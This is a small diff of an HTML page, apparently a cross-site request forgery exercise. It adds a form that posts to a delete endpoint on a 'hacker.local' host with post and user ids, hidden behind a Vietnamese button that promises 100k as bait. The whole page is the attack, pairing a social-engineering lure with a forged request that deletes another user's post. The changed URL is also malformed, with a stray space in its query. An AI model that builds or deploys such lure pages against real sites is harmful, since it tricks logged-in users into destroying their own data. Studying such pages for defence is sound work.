@@ -10,7 +10,7 @@
 <body>
     <img src="./img/hack.jpg" alt="nhn" srcset=""> <br>
     <form action="
-http://localhost/project/delete.php?id=3" method="POST">
+http://hacker.local/delete_post.php?post_id=2 user_id =14" method="POST">
 <input type="hidden"name="content" value="">
    
     <button type="submit"> Hãy click để nhận ngay 100k !!!</button>
